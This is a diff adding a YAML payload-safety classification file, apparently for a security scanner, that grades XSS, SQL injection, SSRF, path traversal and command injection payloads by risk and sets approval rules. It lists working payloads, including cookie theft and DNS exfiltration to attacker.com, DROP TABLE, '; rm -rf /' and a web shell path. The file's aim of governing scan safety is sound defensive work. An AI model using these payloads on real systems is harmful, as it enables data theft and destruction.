@@ -1,0 +1,477 @@
+# GAP 1: Payload Safety Classification System
+# Critical for enterprise production scanning
+
+metadata_type: "Payload Safety Classification"
+version: "1.0"
+last_updated: "2026-02-02"
+description: "Safety levels, destructive flags, and environment restrictions for all payloads"
+
+# Safety Level Definitions
+safety_levels:
+  safe:
+    level: 0
+    description: "Read-only payloads, no data modification, safe for production"
+    auto_scan: true
+    requires_approval: false
+    examples:
+      - "Basic XSS probes with alert()"
+      - "SQL injection detection (1=1 tests)"
+      - "Authentication enumeration"
+    
+  low_risk:
+    level: 1
+    description: "Minimal impact, may cause logs/alerts but no data change"
+    auto_scan: true
+    requires_approval: false
+    examples:
+      - "Encoded XSS payloads"
+      - "Boolean-based blind SQL injection"
+      - "Session token validation"
+    
+  medium_risk:
+    level: 2
+    description: "May trigger WAF/IDS, visible in logs, no permanent changes"
+    auto_scan: false
+    requires_approval: true
+    examples:
+      - "Time-based blind SQL injection (SLEEP)"
+      - "SSRF to cloud metadata endpoints"
+      - "Error-based SQL injection"
+    
+  high_risk:
+    level: 3
+    description: "Could cause service disruption, requires controlled environment"
+    auto_scan: false
+    requires_approval: true
+    environment: ["staging", "dev"]
+    examples:
+      - "Out-of-band SQL injection"
+      - "XXE with external entity resolution"
+      - "Deserialization exploits"
+    
+  destructive:
+    level: 4
+    description: "Data modification, deletion, privilege escalation - MANUAL ONLY"
+    auto_scan: false
+    requires_approval: true
+    manual_only: true
+    environment: ["isolated", "dev"]
+    examples:
+      - "DROP TABLE statements"
+      - "Stacked query INSERT/UPDATE"
+      - "File upload exploits"
+      - "RCE payloads"
+
+# XSS Payload Safety Classifications
+xss_payloads:
+  basic_probes:
+    - payload: "<script>alert(1)</script>"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+      explanation: "Read-only detection, no cookies stolen"
+    
+    - payload: "<img src=x onerror=alert(1)>"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+    
+    - payload: "<svg/onload=alert(1)>"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+      waf_bypass: true
+  
+  encoded_payloads:
+    - payload: "<script>alert(String.fromCharCode(88,83,83))</script>"
+      safety: low_risk
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 1
+      explanation: "Encoded but still safe probe"
+  
+  cookie_theft:
+    - payload: "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
+      safety: high_risk
+      destructive: true
+      environment: [dev, staging]
+      risk_level: 3
+      explanation: "Exfiltrates session cookies - MANUAL ONLY"
+      auto_scan: false
+      requires_approval: true
+    
+    - payload: "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>"
+      safety: high_risk
+      destructive: true
+      environment: [dev, staging]
+      risk_level: 3
+      auto_scan: false
+  
+  dom_manipulation:
+    - payload: "<script>document.body.innerHTML='<h1>Defaced</h1>'</script>"
+      safety: destructive
+      destructive: true
+      environment: [isolated]
+      risk_level: 4
+      explanation: "Modifies page content - PROOF OF CONCEPT ONLY"
+      manual_only: true
+
+# SQL Injection Payload Safety
+sql_injection_payloads:
+  detection_probes:
+    - payload: "' OR '1'='1"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+      explanation: "Read-only authentication bypass detection"
+    
+    - payload: "admin' --"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+    
+    - payload: "1' AND 1=1--"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+      explanation: "Boolean-based detection, no data modification"
+  
+  union_select:
+    - payload: "1' UNION SELECT NULL--"
+      safety: low_risk
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 1
+      explanation: "Column enumeration, read-only"
+    
+    - payload: "1' UNION SELECT username,password FROM users--"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "Extracts sensitive data, visible in logs"
+      auto_scan: false
+  
+  time_based:
+    - payload: "1' AND SLEEP(5)--"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "Causes 5-second delay, may impact performance"
+      auto_scan: false
+    
+    - payload: "1'; WAITFOR DELAY '00:00:05'--"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      auto_scan: false
+  
+  error_based:
+    - payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "Forces error message with data leak"
+  
+  stacked_queries:
+    - payload: "1; DROP TABLE users--"
+      safety: destructive
+      destructive: true
+      environment: [isolated]
+      risk_level: 4
+      explanation: "DELETES DATA - NEVER AUTO-SCAN"
+      manual_only: true
+      requires_approval: true
+    
+    - payload: "1; INSERT INTO users VALUES('hacker','password')--"
+      safety: destructive
+      destructive: true
+      environment: [isolated]
+      risk_level: 4
+      manual_only: true
+    
+    - payload: "1; UPDATE users SET password='hacked'--"
+      safety: destructive
+      destructive: true
+      environment: [isolated]
+      risk_level: 4
+      manual_only: true
+  
+  out_of_band:
+    - payload: "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--"
+      safety: high_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 3
+      explanation: "External DNS/HTTP requests, may leak data"
+      auto_scan: false
+
+# Authentication Bypass Payload Safety
+auth_bypass_payloads:
+  sql_injection:
+    - payload: "admin' OR '1'='1'--"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+      explanation: "Detection only, no actual login if protected"
+    
+    - payload: "' OR 1=1--"
+      safety: safe
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 0
+  
+  nosql_injection:
+    - payload: '{"username": {"$ne": null}, "password": {"$ne": null}}'
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "May successfully bypass auth on vulnerable systems"
+      auto_scan: false
+  
+  jwt_manipulation:
+    - payload: '{"alg":"none","typ":"JWT"}'
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "Algorithm confusion attack, safe if server validates"
+      auto_scan: false
+    
+    - payload: '{"sub":"admin","role":"admin"}'
+      safety: medium_risk
+      destructive: true
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "Privilege escalation attempt"
+      auto_scan: false
+
+# SSRF Payload Safety
+ssrf_payloads:
+  cloud_metadata:
+    - payload: "http://169.254.169.254/latest/meta-data/"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "AWS metadata endpoint - may leak credentials"
+      auto_scan: false
+    
+    - payload: "http://metadata.google.internal/computeMetadata/v1/"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      auto_scan: false
+  
+  internal_scan:
+    - payload: "http://localhost:22"
+      safety: low_risk
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 1
+      explanation: "Port scanning localhost - safe probe"
+    
+    - payload: "http://192.168.1.1/admin"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "Internal network scanning"
+      auto_scan: false
+
+# Path Traversal Payload Safety
+path_traversal_payloads:
+  read_only:
+    - payload: "../../../../etc/passwd"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "File read attempt - no modification"
+      auto_scan: false
+    
+    - payload: "..\\..\\..\\windows\\win.ini"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      auto_scan: false
+  
+  write_attempts:
+    - payload: "../../../../var/www/html/shell.php"
+      safety: destructive
+      destructive: true
+      environment: [isolated]
+      risk_level: 4
+      explanation: "File write/upload - CRITICAL RISK"
+      manual_only: true
+
+# Command Injection Payload Safety
+command_injection_payloads:
+  detection:
+    - payload: "; echo 'test'"
+      safety: low_risk
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 1
+      explanation: "Safe command, read-only"
+    
+    - payload: "| whoami"
+      safety: low_risk
+      destructive: false
+      environment: [dev, staging, prod]
+      risk_level: 1
+  
+  time_based:
+    - payload: "; sleep 5"
+      safety: medium_risk
+      destructive: false
+      environment: [dev, staging]
+      risk_level: 2
+      explanation: "Causes delay, may impact performance"
+      auto_scan: false
+  
+  destructive:
+    - payload: "; rm -rf /"
+      safety: destructive
+      destructive: true
+      environment: [isolated]
+      risk_level: 4
+      explanation: "FILE DELETION - NEVER USE IN REAL SCANS"
+      manual_only: true
+      demo_only: true
+
+# Scanning Rules by Environment
+environment_rules:
+  production:
+    allowed_safety_levels: [safe, low_risk]
+    max_risk_level: 1
+    auto_scan_enabled: true
+    requires_approval: false
+    restrictions:
+      - "No destructive payloads"
+      - "No time-based delays"
+      - "No external callbacks"
+      - "No data exfiltration"
+  
+  staging:
+    allowed_safety_levels: [safe, low_risk, medium_risk, high_risk]
+    max_risk_level: 3
+    auto_scan_enabled: true
+    requires_approval: true
+    restrictions:
+      - "No destructive payloads"
+      - "Requires security team approval for high_risk"
+  
+  development:
+    allowed_safety_levels: [safe, low_risk, medium_risk, high_risk, destructive]
+    max_risk_level: 4
+    auto_scan_enabled: false
+    requires_approval: true
+    restrictions:
+      - "Destructive payloads require explicit opt-in"
+  
+  isolated:
+    allowed_safety_levels: [safe, low_risk, medium_risk, high_risk, destructive]
+    max_risk_level: 4
+    auto_scan_enabled: false
+    manual_only: true
+    description: "Isolated test environment or VM - all payloads allowed"
+
+# Auto-Scan Decision Matrix
+auto_scan_rules:
+  criteria:
+    - name: "Safety Level"
+      condition: "payload.safety IN [safe, low_risk]"
+      allow_auto_scan: true
+    
+    - name: "Environment Match"
+      condition: "current_env IN payload.environment"
+      allow_auto_scan: true
+    
+    - name: "Risk Level"
+      condition: "payload.risk_level <= environment.max_risk_level"
+      allow_auto_scan: true
+    
+    - name: "Destructive Flag"
+      condition: "payload.destructive == false"
+      allow_auto_scan: true
+    
+    - name: "Manual Only"
+      condition: "payload.manual_only == false"
+      allow_auto_scan: true
+  
+  logic: "ALL criteria must be TRUE for auto-scan"
+
+# Payload Selection Algorithm
+selection_algorithm: |
+  function select_payloads(test_case, environment):
+    allowed_payloads = []
+    
+    for payload in test_case.payloads:
+      safety_metadata = get_safety_metadata(payload)
+      
+      # Check environment compatibility
+      if environment not in safety_metadata.environment:
+        continue
+      
+      # Check risk level
+      if safety_metadata.risk_level > environment.max_risk_level:
+        continue
+      
+      # Check destructive flag
+      if safety_metadata.destructive and environment != 'isolated':
+        continue
+      
+      # Check manual_only flag
+      if safety_metadata.manual_only and mode == 'auto_scan':
+        continue
+      
+      # Check approval requirement
+      if safety_metadata.requires_approval and not has_approval:
+        continue
+      
+      allowed_payloads.append(payload)
+    
+    return allowed_payloads
+
+# Approval Workflow
+approval_workflow:
+  low_risk_and_below:
+    approval_required: false
+    auto_execute: true
+  
+  medium_risk:
+    approval_required: true
+    approvers: ["security_team", "dev_lead"]
+    notification: "Email + Slack alert"
+  
+  high_risk:
+    approval_required: true
+    approvers: ["security_team", "ciso"]
+    notification: "Email + Slack + Jira ticket"
+    time_window: "Business hours only"
+  
+  destructive:
+    approval_required: true
+    approvers: ["ciso", "cto"]
+    manual_execution: true
+    isolated_environment: required
+    backup_required: true
+
+references:
+  - "OWASP Testing Guide: Safe Testing Practices"
+  - "PCI DSS Requirement 11.3: Penetration Testing Methodology"
+  - "ISO 27001: A.12.6.1 Management of Technical Vulnerabilities"
